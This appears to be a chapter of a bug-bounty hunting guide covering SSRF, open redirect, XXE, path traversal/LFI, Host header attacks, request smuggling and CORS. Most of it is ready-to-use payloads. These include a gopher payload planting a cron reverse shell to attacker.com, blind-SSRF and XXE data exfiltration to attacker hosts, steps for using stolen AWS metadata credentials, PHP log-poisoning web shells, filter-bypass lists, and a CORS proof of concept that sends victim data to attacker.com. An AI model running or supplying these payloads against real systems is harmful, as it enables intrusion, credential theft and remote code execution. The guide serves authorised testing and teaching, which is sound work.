---
title: "Part 5: SSRF, Open Redirect, XXE & LFI"
nav_order: 6
layout: default
---

*Status: COMPLETE — Iteration 5 (Parts A + B)*

### 5.1 Server-Side Request Forgery (SSRF)

**What it is:**
The server makes an HTTP request on behalf of the attacker. The attacker controls
the URL. The server — which has access to internal network resources, cloud metadata,
and services not accessible from the public internet — fetches attacker-specified URLs
and returns or acts on the response.

SSRF is one of the highest-impact vulnerability classes in cloud-hosted applications.
AWS credential theft via metadata SSRF has led to some of the largest bug bounty payouts.

---

#### 5.1.1 Basic SSRF Detection

🔍 **What to do:**
Find every place the application accepts a URL or makes server-side HTTP requests.
Send a callback URL (interactsh/Collaborator) and check for an incoming request.

**Where SSRF inputs live:**
```
Explicit URL parameters:
  ?url=https://example.com
  ?redirect=https://example.com
  ?link=https://example.com
  ?src=https://example.com
  ?uri=https://example.com
  ?path=https://example.com
  ?fetch=https://example.com
  ?load=https://example.com

Webhook/integration features:
  "Notify me at: https://my-server.com"
  "Slack webhook URL: https://..."
  "Send data to endpoint: https://..."

Import/fetch features:
  "Import from URL"
  "Fetch profile picture from URL"
  "Add RSS feed: https://..."
  "Import CSV from: https://..."

PDF/document generators:
  HTML content with <img src="https://...">
  Header/footer URL fields

Image processing:
  Avatar URL field
  OG image fetch
  URL preview / link unfurl

XML/SOAP payloads:
  Any URL in DOCTYPE, entity definitions, schema locations
```

**Initial probe — use interactsh:**
```bash
# Start listener:
interactsh-client -server interactsh.com
# → Get URL: abc123.interactsh.com

# Submit as URL parameter:
?url=https://abc123.interactsh.com/ssrf-test
?webhook=https://abc123.interactsh.com
?src=http://abc123.interactsh.com

# If you get an HTTP interaction in interactsh → SSRF confirmed
# Check: what IP made the request? (reveals server's IP / internal range)
```

---

#### 5.1.2 Blind SSRF

🔍 **What it is:**
The server makes the request but doesn't return the response to you.
You only know it happened because your OOB server received the callback.

**Blind SSRF still matters because:**
- Confirms server-side request execution
- The server IP in the callback reveals internal network range
- Can pivot to internal port scanning (see 5.1.5)
- Cloud metadata attacks don't require response reflection (redirect chain)

**Detection:**
```bash
# HTTP interaction (confirms HTTP SSRF):
?url=http://abc123.interactsh.com/blind-test

# DNS-only interaction (confirms DNS resolution, implies HTTP):
?url=http://dnsonly.abc123.interactsh.com

# If HTTP doesn't work, try different protocols:
?url=https://abc123.interactsh.com   # HTTPS
?url=ftp://abc123.interactsh.com     # FTP (some parsers follow this)
?url=gopher://abc123.interactsh.com  # Gopher (powerful for internal attacks)
?url=dict://abc123.interactsh.com    # DICT protocol
```

**Escalating blind SSRF to data exfiltration:**
```
Even without response reflection, exfil data via DNS subdomain:
?url=http://$(curl+http://169.254.169.254/latest/meta-data/iam/security-credentials/role+-o+/tmp/creds+&&+cat+/tmp/creds+|+base64+|+tr+-d+'\n'|+cut+-c1-40).abc123.interactsh.com

# (URL-encoded version of the above — sends first 40 chars of AWS creds as DNS subdomain)
# More practical approach: use gopher/HTTP redirect to internal metadata endpoint
```

---

#### 5.1.3 Cloud Metadata Endpoint Attacks

🔍 **The crown jewel of SSRF:** Cloud metadata endpoints are accessible only from
within the cloud instance. If you can make the server fetch them, you get:
AWS credentials, IAM roles, instance identity, user data scripts (often contain secrets).

**AWS EC2 Metadata (IMDSv1 — no auth required):**
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/meta-data/public-ipv4

# The credentials endpoint — Critical finding:
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Returns: role name
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2InstanceRole
# Returns: AccessKeyId, SecretAccessKey, Token → live AWS credentials
```

**AWS IMDSv2 (requires token — harder but not immune):**
```bash
# IMDSv2 requires a PUT request to get a token first
# If SSRF allows PUT or if the app uses redirects, can still work:

# Step 1: Get token via PUT:
?url=http://169.254.169.254/latest/api/token
# with header: X-aws-ec2-metadata-token-ttl-seconds: 21600
# → Returns: TOKEN_VALUE

# Step 2: Use token:
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
# with header: X-aws-ec2-metadata-token: TOKEN_VALUE

# Alternative: if SSRF follows redirects, host a redirect server:
# your-server.com/redirect → 302 → http://169.254.169.254/latest/meta-data/...
```

**GCP Metadata:**
```
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/
# Requires header: Metadata-Flavor: Google

http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/instance/attributes/
```

**Azure Metadata:**
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Requires header: Metadata: true

http://169.254.169.254/metadata/identity/oauth2/token?resource=https://management.azure.com/
```

**DigitalOcean / Generic cloud:**
```
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/
http://192.0.0.1/latest/meta-data/     # alternate metadata IP
http://100.100.100.200/latest/meta-data/ # Alibaba Cloud
```

**In the report:** Show the exact credential response. State:
*"These credentials provide AWS IAM access and can be used to authenticate
to AWS APIs. Depending on the IAM role's permissions, this may allow full
account compromise, data exfiltration, or infrastructure manipulation."*
Capture just the credential structure (AccessKeyId prefix), not the full secret.

---

#### 5.1.4 SSRF Filter Bypass Techniques

🔍 **When the app blocks `169.254.169.254` or `localhost` — bypass:**

**IP encoding variations:**
```bash
# Decimal encoding:
http://2130706433/          # 127.0.0.1 in decimal
http://2852039166/          # 169.254.169.254 in decimal

# Octal:
http://0177.0.0.1/          # 127.0.0.1 in octal
http://0251.0376.0251.0376/ # 169.254.169.254 in octal

# Hex:
http://0x7f000001/          # 127.0.0.1 in hex
http://0xa9fea9fe/          # 169.254.169.254 in hex

# Mixed encoding:
http://127.0.0.1/
http://127.1/               # shorthand
http://0/                   # resolves to 0.0.0.0

# IPv6:
http://[::1]/               # localhost in IPv6
http://[::ffff:169.254.169.254]/  # metadata in IPv6
http://[::ffff:a9fe:a9fe]/        # same in short form

# URL encoding:
http://%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34/
```

**DNS-based bypasses:**
```bash
# Use a domain that resolves to internal IP:
# 127.0.0.1.nip.io → resolves to 127.0.0.1
http://127.0.0.1.nip.io/
http://169.254.169.254.nip.io/   # resolves to 169.254.169.254

# Custom DNS rebinding:
# Register a domain, configure DNS TTL=0
# Initially resolves to a public IP (passes filter check)
# Quickly re-resolves to 127.0.0.1 (exploits race between check and request)
# Tool: https://github.com/nccgroup/singularity

# Redirect server bypass (most reliable):
# Host on your server:
# Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/
?url=http://your-redirect-server.com/to-metadata
# App fetches your server → gets 302 redirect → follows to metadata endpoint
```

**Protocol bypasses:**
```bash
# Gopher protocol (can send arbitrary TCP data, useful for Redis/Memcache):
gopher://internal-redis:6379/_%2A1%0D%0A%248%0D%0AFLUSHALL%0D%0A

# File protocol (read local files):
file:///etc/passwd
file:///proc/self/environ
file:///app/config/database.yml

# Dict protocol:
dict://internal-service:11211/info

# SFTP (if server has SSH client):
sftp://attacker.com:11111/
```

**Blocklist bypass tricks:**
```bash
# Double URL encoding (if server decodes once before checking):
http://%2561%2562%2563.attacker.com   # %25 = %, so %2561 = %61 = a

# Adding credentials (@ separator):
http://attacker@169.254.169.254/      # some parsers use part before @ as creds

# Adding port:
http://169.254.169.254:80/latest/meta-data/
http://169.254.169.254:443/latest/meta-data/

# Path confusion:
http://169.254.169.254#@target.com    # fragment-based confusion
```

---

#### 5.1.5 Internal Port Scanning via SSRF

🔍 **What to do:**
Once you have SSRF, use it to probe internal services. Response time and
content differences reveal open ports on the internal network.

```bash
# Manual port scan via SSRF (use Burp Intruder):
# Payload: http://127.0.0.1:PORT/

# Port list to test (common internal services):
21     FTP
22     SSH
25     SMTP
80     HTTP (internal app)
443    HTTPS
3306   MySQL
5432   PostgreSQL
6379   Redis (unauthenticated by default)
8080   Alternate HTTP
8443   Alternate HTTPS
8888   Jupyter Notebook
9200   Elasticsearch (unauthenticated by default)
11211  Memcached
27017  MongoDB (unauthenticated by default)

# Burp Intruder setup:
# Position: http://127.0.0.1:§PORT§/
# Payload: list of ports above
# Grep for: response time difference, content difference, connection refused vs. timeout

# Interpret results:
# Fast response + content → port open, service running
# "Connection refused" → port closed
# Timeout → filtered or no service
```

**High-value internal services to probe:**
```bash
# Redis — if accessible, read/write data:
?url=http://127.0.0.1:6379/

# Elasticsearch — unauthenticated data access:
?url=http://127.0.0.1:9200/_cat/indices
?url=http://127.0.0.1:9200/_all/_search

# Kubernetes API (if running in K8s):
?url=http://10.96.0.1:443/api/v1/namespaces/default/secrets
?url=http://kubernetes.default.svc/api/v1/pods

# Internal admin panels:
?url=http://127.0.0.1:8080/admin
?url=http://127.0.0.1:9090/   # Prometheus metrics
?url=http://127.0.0.1:4040/   # Ngrok / tunnel admin
```

---

#### 5.1.6 SSRF to RCE Chains

🔍 **Common escalation paths:**

**SSRF → Redis → RCE:**
```bash
# If Redis is accessible via SSRF and has no auth:
# Use gopher protocol to send Redis commands:
# Write a cron job or SSH key via Redis

# Gopher payload to write cron:
gopher://127.0.0.1:6379/_*3%0D%0A$3%0D%0ASET%0D%0A$1%0D%0A1%0D%0A$57%0D%0A%0A%0A*/1 * * * * root bash -i >& /dev/tcp/attacker.com/4444 0>&1%0A%0A%0D%0A*4%0D%0A$6%0D%0ACONFIG%0D%0A$3%0D%0ASET%0D%0A$3%0D%0Adir%0D%0A$16%0D%0A/var/spool/cron%0D%0A

# Tool: Gopherus — generates gopher payloads for Redis, MySQL, FastCGI:
python2 gopherus.py --exploit redis
```

**SSRF → AWS metadata → credential theft → AWS API abuse:**
```bash
# 1. Steal credentials via metadata:
AccessKeyId: ASIA...
SecretAccessKey: xxx
Token: yyy

# 2. Use stolen credentials:
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="xxx"
export AWS_SESSION_TOKEN="yyy"

# 3. Enumerate permissions:
aws sts get-caller-identity
aws iam list-attached-role-policies --role-name EC2InstanceRole
aws s3 ls  # list all buckets
aws secretsmanager list-secrets  # often contains DB passwords, API keys

# 4. Report the credential theft + what those creds can access
# (don't actually exploit further — document the potential)
```

---

#### 5.1.7 Where SSRF Hides — Feature Checklist

```
□ URL/link/src/href parameters in API requests
□ Webhook configuration (integrations, notifications, alerts)
□ "Import from URL" features (CSV, RSS, data import)
□ URL preview / link unfurling (Slack-like features)
□ Profile picture / avatar URL field
□ PDF / document export with HTML content
□ Open Graph / metadata fetch when sharing links
□ Server health check / monitoring endpoints
□ OAuth callback URL fields (if validated via fetch)
□ Image resize / thumbnail generation
□ Email HTML content rendered server-side
□ XML/SOAP inputs with DTD or schema URLs
□ Server-side browser / screenshot services
□ Proxy / relay features (anonymizer, preview services)
□ Collaboration features that fetch external resources
```

📚 **References:**
- [PortSwigger SSRF labs](https://portswigger.net/web-security/ssrf)
- [PayloadsAllTheThings — SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [Gopherus](https://github.com/tarunkant/Gopherus)
- [interactsh](https://github.com/projectdiscovery/interactsh)
- [ssrfuzz](https://github.com/ryandamour/ssrfuzz)

---

### 5.2 Open Redirect

**What it is:**
The application redirects users to a URL taken from user input without validating
that the destination is safe. On its own, impact is Low-Medium. Chained with
OAuth, SSRF, or phishing, it becomes High.

**The reporting trap:** Many hunters report open redirects as standalone findings
and get Low or Informational. The key is always chaining them.

---

#### 5.2.1 Detection

🔍 **Parameters to look for:**
```
?next=
?url=
?redirect=
?redirect_uri=
?return=
?returnto=
?return_url=
?goto=
?destination=
?redir=
?r=
?u=
?link=
?target=
?continue=
?forward=
?callback=
?go=
```

**Initial probe:**
```bash
# Use a clearly distinct domain:
?next=https://evil.com
?redirect=https://attacker.com

# Check: does the response Location header point to your domain?
curl -sv "https://target.com/login?next=https://evil.com" 2>&1 | grep -i "location:"
```

---

#### 5.2.2 Bypass Techniques

🔍 **When the app validates the redirect URL — bypass the validation:**

```bash
# Protocol-based:
?next=//evil.com          # protocol-relative (inherits current scheme)
?next=////evil.com
?next=https:evil.com      # missing //

# @ symbol (user info in URL):
?next=https://target.com@evil.com
?next=https://evil.com@target.com   # some parsers use last @ as host

# Backslash (browser normalizes to forward slash):
?next=https://evil.com\target.com
?next=//evil.com\@target.com

# Subdomain confusion:
?next=https://target.com.evil.com
?next=https://evilcom.target.com.attacker.com

# URL fragment (browser follows redirect, fragment stays):
?next=https://evil.com%23target.com    # evil.com#target.com
?next=https://evil.com%3F.target.com  # evil.com?.target.com

# Unicode/encoding:
?next=https://evil%E3%80%82com       # unicode fullstop
?next=https://evil。com               # ideographic period

# Double encoding:
?next=https%3A%2F%2Fevil.com
?next=%68%74%74%70%73%3A%2F%2Fevil.com

# Parameter pollution:
?next=https://target.com&next=https://evil.com
?next[]=https://evil.com

# Null byte (truncates validation string in some languages):
?next=https://evil.com%00.target.com

# Whitelisted domain as path:
?next=https://evil.com/https://target.com
?next=https://evil.com/.target.com
```

---

#### 5.2.3 Chaining Open Redirect

🔍 **Chain 1 — Open Redirect + OAuth = ATO:**
```
OAuth redirect_uri validation checks if it starts with:
https://target.com/callback

You have open redirect at: https://target.com/goto?url=

Craft:
redirect_uri=https://target.com/goto?url=https://attacker.com

Flow:
1. Victim clicks OAuth link
2. Provider sends auth code to: https://target.com/goto?url=https://attacker.com?code=AUTH_CODE
3. target.com redirects to: https://attacker.com?code=AUTH_CODE
4. Attacker receives auth code → ATO

Why it works: redirect_uri validation passes (starts with target.com)
but the code ends up at attacker.com via the open redirect
```

**Chain 2 — Open Redirect + SSRF:**
```
App validates that SSRF URL must be on allowed domain:
https://target.com/*

Open redirect at target.com allows bypass:
?url=https://target.com/redirect?to=http://169.254.169.254/meta-data/

Server fetches target.com/redirect → gets 302 to metadata → follows it
```

**Chain 3 — Open Redirect + Phishing:**
```
Phishing email: "Click here to reset your password"
Link: https://target.com/login?next=https://evil-clone.com

User sees legitimate target.com URL in the link → trusts it → clicks
→ Gets redirected to convincing phishing clone
Severity: Medium (with social engineering component documented)
```

---

#### 5.2.4 Reporting Open Redirect Accurately

📝 **Standalone open redirect — typical severity:** Low to Medium.
**Chained open redirect — severity:** Depends on chain impact.

```
Standalone report title:
"Open Redirect at /login?next= allows redirect to arbitrary external domains"

Chained report title:
"Open Redirect chains with OAuth redirect_uri to enable Authorization Code theft"

Impact statement (standalone):
"While an open redirect alone has limited direct impact, it enables phishing
attacks that leverage the trusted target.com domain in the URL to deceive users."

Impact statement (chained with OAuth):
"This open redirect can be combined with the OAuth flow to redirect authorization
codes to an attacker-controlled server, leading to full account takeover without
user interaction beyond visiting a crafted URL."
```

⚠️ **Gotchas:**
- Many programs treat standalone open redirects as Informational or won't pay.
  Always invest 15 minutes trying to chain it before submitting.
- JavaScript-based redirects (`window.location = param`) are DOM XSS territory,
  not open redirect — report them as DOM XSS (higher severity).

📚 **References:**
- [PortSwigger — Open redirect](https://portswigger.net/kb/issues/00500100_open-redirection-reflected)
- [PayloadsAllTheThings — Open Redirect](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect)

---

### 5.3 XXE (XML External Entity)

**What it is:**
XML parsers support external entities — references to resources outside the XML document.
If the parser is misconfigured (or uses an older default), user-supplied XML can define
an external entity that reads local files, triggers SSRF, or exfiltrates data.

---

#### 5.3.1 Classic XXE — File Read

🔍 **Basic payload:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```

**Submit this wherever the app accepts XML:**
- SOAP endpoints
- REST APIs with `Content-Type: application/xml`
- File upload (see 5.3.3)
- Any parameter that looks like XML-structured data

**Useful files to read:**
```
/etc/passwd                          # user accounts, confirms LFI
/etc/hosts                           # internal hostnames
/proc/self/environ                   # environment variables (secrets)
/proc/self/cmdline                   # running process command
/app/config/database.yml             # DB credentials
/var/www/html/config.php             # PHP app config
/home/<user>/.ssh/id_rsa             # SSH private key
/root/.ssh/id_rsa                    # root SSH key
C:\Windows\win.ini                   # Windows target confirmation
C:\inetpub\wwwroot\web.config        # .NET app config
```

**Confirming vulnerable XML parser:**
```bash
# Submit and check if file contents appear in response:
curl -s -X POST https://target.com/api/parse \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><data>&xxe;</data></root>'

# Look for: root:x:0:0:root:/root:/bin/bash in response
```

---

#### 5.3.2 Blind XXE — OOB via DTD

🔍 **What it is:**
The parser processes the external entity but doesn't return the content in the response.
Use OOB exfiltration: the server makes a DNS/HTTP request to your server carrying the data.

**Step 1 — Host a malicious DTD on your server:**
```xml
<!-- Save as evil.dtd at https://attacker.com/evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM 'https://attacker.com/?data=%file;'>">
%exfil;
%send;
```

**Step 2 — Payload referencing your DTD:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "https://attacker.com/evil.dtd">
  %xxe;
]>
<root><data>test</data></root>
```

**When file contents have characters that break URLs (spaces, newlines):**
```xml
<!-- evil.dtd with base64 encoding: -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://attacker.com/?x=%file;'>">
%eval;
%exfil;

<!-- For files with special chars, use PHP wrapper: -->
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://attacker.com/?x=%file;'>">
%eval;
%exfil;
```

**Using interactsh:**
```bash
# Start listener:
interactsh-client

# Simple DNS confirmation (confirms XXE without file read):
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://abc123.interactsh.com/xxe-test">]>
<root><data>&xxe;</data></root>
# HTTP interaction received = XXE confirmed
```

---

#### 5.3.3 XXE via File Upload

🔍 **File formats that contain XML — all are potential XXE vectors:**

**SVG upload:**
```xml
<!-- Upload as image.svg -->
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

**DOCX/XLSX/PPTX (Office Open XML formats):**
```bash
# These are ZIP files containing XML — unzip, inject, rezip:

# 1. Unzip the docx:
mkdir docx_xxe && cp test.docx docx_xxe/ && cd docx_xxe
unzip test.docx

# 2. Edit word/document.xml (or xl/workbook.xml for xlsx):
# Add XXE payload to the top of the XML file:
# <?xml version="1.0"?>
# <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
# Insert &xxe; somewhere in the document body

# 3. Rezip:
zip -r ../malicious.docx .

# 4. Upload the modified file
# If the app parses/previews the document server-side → XXE fires
```

**XLSX specific:**
```bash
# xl/workbook.xml is the main target
# Insert entity in a cell value that gets parsed
```

**XML-based config files:**
```
Any file upload that accepts: .xml, .svg, .html, .xhtml, .docx, .xlsx, .pptx,
.odt, .ods, .rss, .atom, .kml, .gpx, .xslt, .wsdl
```

---

#### 5.3.4 XXE via SOAP Endpoints

🔍 **SOAP is XML by design — always test for XXE:**
```xml
POST /api/soap HTTP/1.1
Content-Type: text/xml; charset=utf-8
SOAPAction: "getUserInfo"

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <getUserInfo>
      <userId>&xxe;</userId>
    </getUserInfo>
  </soap:Body>
</soap:Envelope>
```

**Finding SOAP endpoints:**
```bash
# Look for WSDL files (describe the SOAP API):
https://target.com/service?wsdl
https://target.com/api.wsdl
https://target.com/ws/service.wsdl

# WSDL reveals all operations and their parameters
curl -s "https://target.com/service?wsdl" | grep -i "operation\|message\|element"
```

---

#### 5.3.5 XXE to SSRF

🔍 **Use XXE to reach internal services:**
```xml
<!-- Read AWS metadata: -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
<root><data>&xxe;</data></root>

<!-- Probe internal ports: -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:6379/">]>
<root><data>&xxe;</data></root>

<!-- Internal service discovery: -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-app.target.internal/admin">]>
<root><data>&xxe;</data></root>
```

---

#### 5.3.6 XXE Testing Checklist
```
□ Any endpoint accepting XML body → inject basic file read payload
□ Content-Type: application/xml, text/xml — always test
□ JSON endpoint — try switching to XML (change Content-Type, restructure body)
□ File uploads: SVG, DOCX, XLSX, PPTX, XML
□ SOAP endpoints — WSDL first, then XXE in every field
□ Blind XXE: DTD-based OOB with interactsh
□ PHP targets: use php://filter wrapper for base64 exfil
□ XXE → SSRF: target metadata endpoints after confirming XXE
```

📚 **References:**
- [PortSwigger XXE labs](https://portswigger.net/web-security/xxe)
- [PayloadsAllTheThings — XXE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)

---

### 5.4 Local File Inclusion / Path Traversal

**What it is:**
User-controlled input is used to construct a file path on the server.
An attacker injects `../` sequences to escape the intended directory
and read arbitrary files.

---

#### 5.4.1 Basic Path Traversal

🔍 **Probe patterns:**
```bash
# In URL parameters:
?file=../../etc/passwd
?path=../../../etc/passwd
?template=../../../../etc/passwd
?doc=../../../etc/shadow
?page=../../etc/passwd%00  # null byte (older PHP)

# In file download endpoints:
GET /download?name=../../etc/passwd
GET /api/files/../../etc/passwd
GET /static/../../../etc/passwd

# Windows targets:
?file=..\..\windows\win.ini
?file=..\..\..\boot.ini
?path=../../windows/system32/drivers/etc/hosts

# With URL encoding:
?file=..%2F..%2Fetc%2Fpasswd
?file=..%252F..%252Fetc%252Fpasswd  # double encoded
?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd

# UNC path (Windows):
?file=\\attacker.com\share\evil   # forces SMB connection
```

**Quick confirmation:**
```bash
curl -s "https://target.com/download?file=../../etc/passwd"
# Look for: root:x:0:0: in response
```

---

#### 5.4.2 Filter Bypass Techniques

🔍 **When `../` is stripped or blocked:**
```bash
# Encoding variants:
..%2F          # URL encoded /
..%252F        # double URL encoded
..%c0%af       # overlong UTF-8 encoding of /
..%c1%9c       # Windows path separator encoded

# Case variation (Windows):
..\
..\/           # mixed separators

# Nested traversal (if filter strips ../ once):
....//         # after stripping ../ → ../
....\/
..../....//

# Absolute path (if filter only checks relative):
?file=/etc/passwd
?file=/var/www/html/../../../etc/passwd

# Null byte (truncates extension check in old PHP):
?file=../../etc/passwd%00.jpg
?file=../../etc/passwd\0.jpg

# Extra characters:
?file=../../etc/passwd.
?file=../../etc/passw%64   # 'd' encoded
```

---

#### 5.4.3 LFI to RCE

🔍 **Escalation paths when you have file read:**

**Log poisoning (Apache/Nginx):**
```bash
# Step 1: Inject PHP code into access log via User-Agent:
curl -s "https://target.com/" \
  -H "User-Agent: <?php system(\$_GET['cmd']); ?>"

# Step 2: Include the log file:
?file=../../var/log/apache2/access.log&cmd=id

# Other log files:
/var/log/apache2/access.log
/var/log/nginx/access.log
/proc/self/fd/1             # stdin/stdout
/var/log/auth.log           # SSH log (inject via failed SSH login)
```

**PHP wrappers (most reliable for PHP targets):**
```bash
# Read PHP source (base64 encoded — bypasses code execution):
?file=php://filter/convert.base64-encode/resource=index.php
# Decode the response to see PHP source code

# Execute arbitrary code via data wrapper:
?file=data://text/plain,<?php system('id'); ?>
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+

# Expect wrapper (if enabled):
?file=expect://id

# ZIP wrapper (if you can upload a zip):
# Upload malicious.zip containing shell.php
?file=zip:///uploads/malicious.zip%23shell.php
```

**PHP session file:**
```bash
# Session files stored at: /var/lib/php/sessions/sess_<session_id>
# If your session ID is: abc123
# File: /var/lib/php/sessions/sess_abc123

# Inject PHP into a session variable:
# Set a cookie/parameter that gets stored in session: <?php system($_GET['cmd']); ?>
# Then include the session file:
?file=../../var/lib/php/sessions/sess_abc123&cmd=id
```

---

#### 5.4.4 File Download Endpoints as LFI Surface

🔍 **High-value test — any file download feature:**
```bash
# Patterns that suggest file download:
GET /download?filename=report.pdf
GET /api/files/export?path=output.csv
GET /static/documents/invoice.pdf
POST /api/export {"filename": "report.pdf"}

# Test traversal:
GET /download?filename=../../etc/passwd
GET /api/files/export?path=../../../../etc/shadow
POST /api/export {"filename": "../../../etc/passwd"}

# On Windows targets:
GET /download?filename=..\..\Windows\win.ini

# Arbitrary read → what to target:
/etc/passwd, /etc/shadow                    # user creds
/proc/self/environ                          # env vars with secrets
/proc/self/cmdline                          # running command
/app/config/database.yml                   # DB connection string
/var/www/html/config.php                   # app secrets
/home/<user>/.aws/credentials              # AWS keys
/root/.ssh/authorized_keys                 # SSH keys
/.env, /app/.env                           # environment file
```

📚 **References:**
- [PortSwigger Path traversal labs](https://portswigger.net/web-security/file-path-traversal)
- [PayloadsAllTheThings — LFI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)

---

### 5.5 Host Header Injection

🔍 **Beyond password reset (already covered in 2.2.2), Host header injection
enables two additional attack classes:**

#### 5.5.1 Web Cache Poisoning via Host Header

**What it is:**
If a caching layer caches responses that include the Host header value
(e.g., in a link or script src), an attacker can poison the cache
so other users receive a response containing the attacker's domain.

```bash
# Test: does the response reflect the Host header?
curl -sv -H "Host: evil.com" https://target.com/ 2>&1 | \
  grep -i "evil.com"

# If reflected in a script src, link href, or canonical URL:
# <script src="https://evil.com/static/app.js"></script>
# → Cache this response → all users loading the page get attacker's JS

# Also test X-Forwarded-Host (often trusted by apps behind proxies):
curl -H "Host: target.com" -H "X-Forwarded-Host: evil.com" https://target.com/
```

**Cache poisoning confirms:**
```
1. Host header reflected in cacheable response
2. Response is cached (check: X-Cache: HIT, Age: N, Cache-Control: public)
3. Other users receive the poisoned response
```

#### 5.5.2 SSRF via Host Header

```bash
# Some internal routing uses Host header to determine backend:
curl -H "Host: internal-app.internal:8080" https://target.com/
# If app forwards based on Host → SSRF to internal service

# Absolute URL in request line:
GET http://169.254.169.254/latest/meta-data/ HTTP/1.1
Host: target.com
# Some proxy setups forward the absolute URL regardless of Host
```

📚 **References:**
- [PortSwigger Host header attacks](https://portswigger.net/web-security/host-header)
- [PortSwigger Web cache poisoning](https://portswigger.net/web-security/web-cache-poisoning)

---

### 5.6 HTTP Request Smuggling

**What it is:**
Frontend (load balancer/CDN) and backend servers disagree on where one HTTP
request ends and the next begins. An attacker smuggles a partial request that
poisons the backend's buffer — prepending it to the next legitimate user's request.
Impact: hijack other users' requests, bypass access controls, cache poisoning.

**Complexity note:** Request smuggling is among the most technically complex
web vulnerabilities. Full coverage belongs in PortSwigger's research (James Kettle).
This section covers detection and the reporting standard.

---

#### 5.6.1 CL.TE and TE.CL Variants

```
CL.TE: Frontend uses Content-Length, backend uses Transfer-Encoding
TE.CL: Frontend uses Transfer-Encoding, backend uses Content-Length
TE.TE: Both use TE but one can be obfuscated to ignore it
```

**Detection via timing (safe, no poisoning):**
```http
# CL.TE probe — backend waits for more data (times out):
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

1
A
X  ← backend waits for chunk terminator that never comes → ~10 second hang

# TE.CL probe:
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

X  ← frontend sends CL=6 bytes, backend finishes at 0\r\n\r\n, leftover X poisons
```

🛠️ **HTTP Request Smuggler (Burp extension):**
```
Install: BApp Store → "HTTP Request Smuggler"
Right-click any request → Extensions → HTTP Request Smuggler → Smuggle Probe
It safely tests for all variants and reports which type is present
```

📚 **References:**
- [PortSwigger — HTTP Request Smuggling (James Kettle)](https://portswigger.net/web-security/request-smuggling)
- [HTTP Request Smuggler (BApp)](https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646)
- This vulnerability class requires deep study — complete all PortSwigger labs
  before attempting on live targets.

---

### 5.7 CORS Misconfiguration

**What it is:**
Cross-Origin Resource Sharing controls which origins can read responses from
cross-origin requests. A misconfigured CORS policy can allow an attacker's
site to make authenticated requests to the target API and read the responses —
leading to data theft or account takeover.

---

#### 5.7.1 Reflected Origin

🔍 **The most common misconfiguration — server reflects whatever Origin you send:**

```bash
# Test: send your origin, check if it's reflected in ACAO header:
curl -sv -H "Origin: https://attacker.com" \
  https://target.com/api/user/profile \
  -H "Cookie: session=<your_token>" 2>&1 | \
  grep -i "access-control"

# Vulnerable response:
# Access-Control-Allow-Origin: https://attacker.com
# Access-Control-Allow-Credentials: true
# ↑ Both needed for exploitation — ACAO must match origin AND credentials allowed
```

**PoC — read victim's data from attacker's page:**
```html
<!-- Host at https://attacker.com/poc.html -->
<script>
fetch('https://target.com/api/user/profile', {
  credentials: 'include'   // sends victim's cookies
})
.then(r => r.json())
.then(data => {
  // Exfil data to attacker server:
  fetch('https://attacker.com/steal?data=' + JSON.stringify(data))
})
</script>
<!-- Victim visits attacker.com → their profile data sent to attacker -->
```

---

